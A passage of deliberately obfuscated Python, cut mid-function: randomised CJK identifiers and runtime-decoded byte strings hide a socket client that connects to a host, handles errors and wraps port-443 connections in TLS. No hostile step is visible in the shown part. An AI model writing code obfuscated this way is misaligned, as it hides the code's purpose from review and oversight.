樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x04'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))()]))))())())()).SOCK_STREAM)
                        client.settimeout(timeout)
                        client.connect((hostname, port))
                    except 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x04'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))()]))))())())()).gaierror as e:
                        raise 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))()]))))())())()).exceptions.ConnectionError((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xdf'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0f'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc1'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x14'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x16'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc2'))()]))))())())().format(str(e)))
                    except Exception as e:
                        襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))()]))))())())()).error((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd3'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x14'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xc9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x16'))()]))))())())().format(str(e)))
                        return None
                    except:
                        襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))()]))))())())()).error((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xd3'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xdc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfa'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\n'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xb9'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))()]))))())())())
                        return None
                    if port == (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x01\xbb'))():
                        context = 襺糰蚩瘢倓槓((lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))()]))))())())()).create_default_context()
                        client = context.wrap_socket(client, server_hostname=hostname)
                    response = b''
                    try:
